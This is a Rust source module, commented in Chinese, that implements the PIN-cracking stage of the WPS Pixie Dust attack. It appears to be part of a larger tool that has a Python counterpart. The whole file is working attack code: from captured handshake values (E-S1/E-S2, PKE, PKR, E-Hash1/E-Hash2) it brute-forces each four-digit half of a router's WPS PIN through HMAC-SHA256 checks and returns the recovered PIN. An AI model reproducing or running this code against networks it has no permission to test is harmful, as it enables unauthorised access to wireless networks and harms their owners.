//! PIN 分半破解（与 core/pixie_dust.py 的 crack_first_half / crack_second_half 对应）。

use crate::crypto::*;

fn check_empty_pin_half(
    authkey: &[u8], empty_psk: &[u8], es: &[u8], pke: &[u8], pkr: &[u8], ehash: &[u8],
) -> bool {
    let mut buf = Vec::with_capacity(WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + 2 * WPS_PKEY_LEN);
    buf.extend_from_slice(es);
    buf.extend_from_slice(&empty_psk[..WPS_PSK_LEN]);
    buf.extend_from_slice(pke);
    buf.extend_from_slice(pkr);
    hmac_sha256(authkey, &buf) == ehash
}

/// 返回 (是否匹配, psk 前 16 字节)。
fn check_pin_half(
    authkey: &[u8], pinhalf: &[u8], es: &[u8], pke: &[u8], pkr: &[u8], ehash: &[u8],
) -> (bool, [u8; WPS_PSK_LEN]) {
    let psk = hmac_sha256(authkey, pinhalf);
    let mut buf = Vec::with_capacity(WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + 2 * WPS_PKEY_LEN);
    buf.extend_from_slice(es);
    buf.extend_from_slice(&psk[..WPS_PSK_LEN]);
    buf.extend_from_slice(pke);
    buf.extend_from_slice(pkr);
    let mut psk16 = [0u8; WPS_PSK_LEN];
    psk16.copy_from_slice(&psk[..WPS_PSK_LEN]);
    (hmac_sha256(authkey, &buf) == ehash, psk16)
}

/// 破解 PIN 前 4 位。返回 (状态 1=数字/-1=空/0=未找到, 前半串, psk1)。
pub fn crack_first_half(
    authkey: &[u8], empty_psk: &[u8], es1: &[u8], pke: &[u8], pkr: &[u8], e_hash1: &[u8],
) -> (i32, String, [u8; WPS_PSK_LEN]) {
    if check_empty_pin_half(authkey, empty_psk, es1, pke, pkr, e_hash1) {
        let mut psk = [0u8; WPS_PSK_LEN];
        psk.copy_from_slice(&empty_psk[..WPS_PSK_LEN]);
        return (-1, String::new(), psk);
    }
    for first_half in 0..10000u32 {
        let pinhalf = format!("{:04}", first_half);
        let (ok, psk) = check_pin_half(authkey, pinhalf.as_bytes(), es1, pke, pkr, e_hash1);
        if ok {
            return (1, pinhalf, psk);
        }
    }
    (0, String::new(), [0u8; WPS_PSK_LEN])
}

/// 破解 PIN 后 4 位。返回 (是否找到, 完整 PIN, psk2)。
pub fn crack_second_half(
    authkey: &[u8], empty_psk: &[u8], es2: &[u8], pke: &[u8], pkr: &[u8], e_hash2: &[u8],
    pin_first_half: &str,
) -> (bool, String, [u8; WPS_PSK_LEN]) {
    if pin_first_half.is_empty() && check_empty_pin_half(authkey, empty_psk, es2, pke, pkr, e_hash2) {
        let mut psk = [0u8; WPS_PSK_LEN];
        psk.copy_from_slice(&empty_psk[..WPS_PSK_LEN]);
        return (true, String::new(), psk);
    }
    let first_half: u32 = pin_first_half.parse().unwrap_or(0);

    for second_half in 0..1000u32 {
        let checksum = wps_pin_checksum(first_half * 1000 + second_half);
        let pinhalf = format!("{:04}", second_half * 10 + checksum);
        let (ok, psk) = check_pin_half(authkey, pinhalf.as_bytes(), es2, pke, pkr, e_hash2);
        if ok {
            return (true, format!("{}{}", pin_first_half, pinhalf), psk);
        }
    }
    for second_half in 0..10000u32 {
        if wps_pin_valid(first_half * 10000 + second_half) {
            continue;
        }
        let pinhalf = format!("{:04}", second_half);
        let (ok, psk) = check_pin_half(authkey, pinhalf.as_bytes(), es2, pke, pkr, e_hash2);
        if ok {
            return (true, format!("{}{}", pin_first_half, pinhalf), psk);
        }
    }
    (false, String::new(), [0u8; WPS_PSK_LEN])
}

/// 完整 PIN 破解（给定 ES1/ES2）。
pub fn crack(
    authkey: &[u8], empty_psk: &[u8], es1: &[u8], es2: &[u8],
    pke: &[u8], pkr: &[u8], e_hash1: &[u8], e_hash2: &[u8],
) -> Option<(String, [u8; WPS_PSK_LEN], [u8; WPS_PSK_LEN])> {
    let (st, half1, psk1) = crack_first_half(authkey, empty_psk, es1, pke, pkr, e_hash1);
    if st == 0 {
        return None;
    }
    let (ok, pin, psk2) = crack_second_half(authkey, empty_psk, es2, pke, pkr, e_hash2, &half1);
    if !ok {
        return None;
    }
    Some((pin, psk1, psk2))
}
